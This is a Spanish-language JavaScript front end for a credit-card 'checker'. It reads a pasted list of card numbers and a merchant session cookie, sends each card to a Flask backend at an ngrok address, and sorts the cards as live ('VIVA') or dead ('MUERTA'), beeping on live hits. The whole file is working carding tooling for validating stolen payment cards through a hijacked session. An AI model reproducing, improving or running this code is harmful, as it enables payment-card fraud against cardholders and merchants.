// ====== SONIDOS SIN ARCHIVOS (WEB AUDIO API) ======
let _audioCtx;
let _lastBeep = 0;

function _ctx() {
    if (!_audioCtx) _audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    return _audioCtx;
}

function _beep({ freq = 440, dur = 0.12, type = 'sine', vol = 0.15 }) {
    const now = _ctx().currentTime;
    if (now - _lastBeep < 0.05) return;
    _lastBeep = now;
    const osc = _ctx().createOscillator();
    const gain = _ctx().createGain();
    osc.type = type;
    osc.frequency.setValueAtTime(freq, now);
    gain.gain.setValueAtTime(vol, now);
    gain.gain.exponentialRampToValueAtTime(0.0001, now + dur);
    osc.connect(gain);
    gain.connect(_ctx().destination);
    osc.start(now);
    osc.stop(now + dur);
}

// Beep doble agudo = LIVE (VIVA)
function playLiveSound() {
    _beep({ freq: 880, dur: 0.09, type: 'sine', vol: 0.18 });
    setTimeout(() => _beep({ freq: 1046, dur: 0.11, type: 'sine', vol: 0.18 }), 110);
}

// Beep grave “buzz” corto = ERROR
function playErrorSound() {
    _beep({ freq: 220, dur: 0.18, type: 'square', vol: 0.16 });
}

// URL de tu backend Flask
const FLASK_URL = 'https://doughtier-merilyn-catamenial.ngrok-free.dev';

// --- ESTADO GLOBAL ---
let ccList = [];
let running = false;
let paused = false;
let currentIndex = 0;
const results = {
    TOTAL: 0,
    TESTED: 0,
    VIVA: 0,
    MUERTA: 0,
    ERROR: 0,
    COOKIE_EXPIRADA: 0,
    logs: []
};
let currentFilter = 'all';

// --- REFERENCIAS DOM ---
const cookieArea = document.getElementById('cookie-area');
const ccListArea = document.getElementById('cc-list-area');
const startBtn = document.getElementById('start-btn');
const pauseBtn = document.getElementById('pause-btn');
const stopBtn = document.getElementById('stop-btn');
const clearBtn = document.getElementById('clear-btn');
const statusDisplay = document.getElementById('checker-status');
const logContainer = document.getElementById('log-container');
const logFilterTitle = document.getElementById('log-filter-title');

const creditBadge = document.getElementById('credit-badge');
const logoutBtn = document.querySelector('.btn.logout');

const recDot = statusDisplay ? statusDisplay.querySelector('.rec') : null;
const resultsSection = document.getElementById('results-section');
const formSection = document.getElementById('form-section');

// --- FUNCIONES DE UTILIDAD Y UI ---

function updateStatus(message, isRunning = false) {
    if (statusDisplay) {
        statusDisplay.innerHTML = `<span class="rec ${isRunning ? 'active' : ''}"></span> ${message}`;
        const dot = statusDisplay.querySelector('.rec');
        if (dot) dot.classList.toggle('active', isRunning);
    }
}

function updateStats() {
    const byId = id => document.getElementById(id);
    const safeSet = (id, val) => { const el = byId(id); if (el) el.textContent = val; };

    safeSet('count-VIVA', results.VIVA);
    safeSet('count-MUERTA', results.MUERTA);
    safeSet('count-ERROR', results.ERROR + results.COOKIE_EXPIRADA);
    safeSet('count-TESTED', results.TESTED);
    safeSet('count-TOTAL', results.TOTAL);

    safeSet('icon-count-TOTAL', results.TOTAL);
    safeSet('icon-count-VIVA', results.VIVA);
    safeSet('icon-count-MUERTA', results.MUERTA);
    safeSet('icon-count-ERROR', results.ERROR + results.COOKIE_EXPIRADA);
}

function loadCredits() {
    if (creditBadge) {
        creditBadge.innerHTML = `<span class="dot"></span> Sesión activa - <b>30 CRÉDITOS</b>`;
    }
}

function updateLogDisplay() {
    if (!resultsSection || !formSection) return;

    if (currentFilter === 'all') {
        resultsSection.style.display = 'none';
        formSection.style.display = 'block';
        return;
    } else {
        resultsSection.style.display = 'block';
        formSection.style.display = 'none';
    }

    if (logContainer) logContainer.innerHTML = '';
    let filteredLogs = results.logs;

    if (currentFilter !== 'all') {
        if (currentFilter === 'ERROR') {
            filteredLogs = results.logs.filter(log =>
                log.estado === 'ERROR' || log.estado === 'COOKIE_EXPIRADA' || log.estado === 'DESCONOCIDO'
            );
        } else {
            filteredLogs = results.logs.filter(log => log.estado === currentFilter);
        }
    }

    if (logFilterTitle) {
        logFilterTitle.textContent = currentFilter === 'all' ? 'Todas' : currentFilter;
    }

    filteredLogs.slice().reverse().forEach(log => {
        const item = document.createElement('div');
        let estadoClase = log.estado;
        let estadoTexto = log.estado;

        if (log.estado === 'COOKIE_EXPIRADA') {
            estadoClase = 'ERROR';
            estadoTexto = '🍪 EXPIRADA';
        } else if (log.estado === 'DESCONOCIDO') {
            estadoClase = 'ERROR';
            estadoTexto = '⚠️ DESCONOCIDO';
        } else if (log.estado === 'VIVA') {
            estadoTexto = '✅ VIVA';
        } else if (log.estado === 'MUERTA') {
            estadoTexto = '❌ MUERTA';
        }

        const statusMap = {
            'VIVA': 'VIVA',
            'MUERTA': 'MUERTA',
            'ERROR': 'ERROR',
            'COOKIE_EXPIRADA': 'ERROR',
            'DESCONOCIDO': 'ERROR'
        };

        item.className = 'log-item';
        item.innerHTML = `
            <div class="log-cc">
                ${log.cc}
                <span class="log-result result-${statusMap[estadoClase]}">${estadoTexto}</span>
            </div>
        `;
        if (logContainer) logContainer.appendChild(item);
    });
}

function formatCard(cc) {
    return cc.replace(/[^0-9|]/g, '').trim();
}

// --- LÓGICA PRINCIPAL DEL CHECKER ---

async function checkCard(cc) {
    const cookie = cookieArea ? cookieArea.value.trim() : '';
    const formattedCC = formatCard(cc);

    if (!cookie || !formattedCC) {
        return 'ERROR';
    }

    try {
        const response = await fetch(`${FLASK_URL}/check_cc`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cc: formattedCC, cookie })
        });

        const data = await response.json();

        if (data.estado === 'COOKIE_EXPIRADA') {
            results.logs.push({
                estado: 'COOKIE_EXPIRADA',
                cc: formattedCC,
                banco: 'N/A',
                pais: 'N/A',
                flag: '🍪',
                raw: data.mensaje
            });
            playErrorSound();
            return 'COOKIE_EXPIRADA';
        }

        if (!response.ok || data.estado === 'ERROR' || data.estado === 'DESCONOCIDO') {
            results.logs.push({
                estado: data.estado === 'ERROR' ? 'ERROR' : 'DESCONOCIDO',
                cc: formattedCC,
                banco: 'N/A',
                pais: 'N/A',
                flag: '❌',
                raw: data.mensaje || `Error HTTP: ${response.status}`
            });
            playErrorSound();
            return 'ERROR';
        }

        results.logs.push({
            estado: data.estado,
            cc: formattedCC,
            banco: data.banco || 'N/A',
            pais: data.pais || 'N/A',
            flag: data.flag || '',
            raw: data.raw || 'N/A'
        });

        if (data.estado === 'VIVA') playLiveSound();

        return data.estado;

    } catch (error) {
        console.error("Error al chequear tarjeta (Fallo de red/CORS):", error);
        results.logs.push({
            estado: 'ERROR',
            cc: formattedCC,
            banco: 'N/A',
            pais: 'N/A',
            flag: '🌐',
            raw: 'Error de conexión con el backend Flask.'
        });
        playErrorSound();
        return 'ERROR';
    }
}

async function startChecking() {
    if (running) return;

    ccList = ccListArea ? ccListArea.value.split('\n').map(c => c.trim()).filter(c => c.length > 0) : [];
    results.TOTAL = ccList.length;

    if (results.TOTAL === 0) {
        updateStatus("ERROR: No hay tarjetas en la lista.", false);
        return;
    }

    running = true;
    paused = false;
    currentIndex = results.TESTED;

    if (startBtn) startBtn.disabled = true;
    if (pauseBtn) pauseBtn.disabled = false;
    if (stopBtn) stopBtn.disabled = false;
    updateStatus(`Iniciando chequeo... Tarjetas: ${results.TOTAL}`, true);

    for (; currentIndex < ccList.length; currentIndex++) {
        if (!running || paused) break;

        const cc = ccList[currentIndex];
        await new Promise(r => setTimeout(r, 150));

        updateStatus(`Chequeando ${currentIndex + 1}/${results.TOTAL}: ${cc.substring(0, 6)}...`, true);
        const status = await checkCard(cc);
        results.TESTED++;

        if (status === 'VIVA') {
            results.VIVA++;
        } else if (status === 'MUERTA') {
            results.MUERTA++;
        } else if (status === 'COOKIE_EXPIRADA') {
            results.COOKIE_EXPIRADA++;
            updateStatus("COOKIE EXPIRADA. Proceso detenido.", false);
            running = false;
            paused = false;
            break;
        } else {
            results.ERROR++;
        }

        updateStats();
        updateLogDisplay();
    }

    if (running) updateStatus("Chequeo finalizado.", false);

    if (!paused) {
        running = false;
        if (startBtn) startBtn.disabled = false;
        if (pauseBtn) pauseBtn.disabled = true;
        if (stopBtn) stopBtn.disabled = true;
    } else {
        updateStatus(`PAUSADO. Index: ${currentIndex + 1}/${ccList.length}`, false);
    }
}

// --- EVENT LISTENERS ---
document.addEventListener('DOMContentLoaded', () => {
    loadCredits();
    updateStats();
    updateStatus("Detenido. Esperando lista y cookie.", false);
    updateLogDisplay();

    if (startBtn) startBtn.addEventListener('click', () => {
        paused = false;
        startChecking();
    });

    if (pauseBtn) pauseBtn.addEventListener('click', () => {
        if (running) {
            running = false;
            paused = true;
            updateStatus(`PAUSADO. Index: ${currentIndex + 1}/${ccList.length}`, false);
            if (startBtn) startBtn.disabled = false;
            if (pauseBtn) pauseBtn.disabled = true;
            if (stopBtn) stopBtn.disabled = false;
        }
    });

    if (stopBtn) stopBtn.addEventListener('click', () => {
        running = false;
        paused = false;
        currentIndex = 0;
        updateStatus("PARADO. Presione INICIAR para comenzar de nuevo.", false);
        if (startBtn) startBtn.disabled = false;
        if (pauseBtn) pauseBtn.disabled = true;
        if (stopBtn) stopBtn.disabled = true;
    });

    if (clearBtn) clearBtn.addEventListener('click', () => {
        if (running) return;
        Object.keys(results).forEach(key => {
            if (typeof results[key] === 'number') results[key] = 0;
        });
        results.logs = [];
        if (ccListArea) ccListArea.value = '';
        currentIndex = 0;
        updateStats();
        updateLogDisplay();
        updateStatus("Detenido. Listas y resultados limpiados.", false);
    });

    if (logoutBtn) logoutBtn.addEventListener('click', () => {
        alert("Sesión cerrada (simulación).");
    });

    document.querySelectorAll('.iconbar .icon').forEach(icon => {
        icon.addEventListener('click', function () {
            document.querySelectorAll('.iconbar .icon').forEach(i => i.classList.remove('active'));
            this.classList.add('active');
            currentFilter = this.getAttribute('data-filter');
            updateLogDisplay();
        });
    });
});


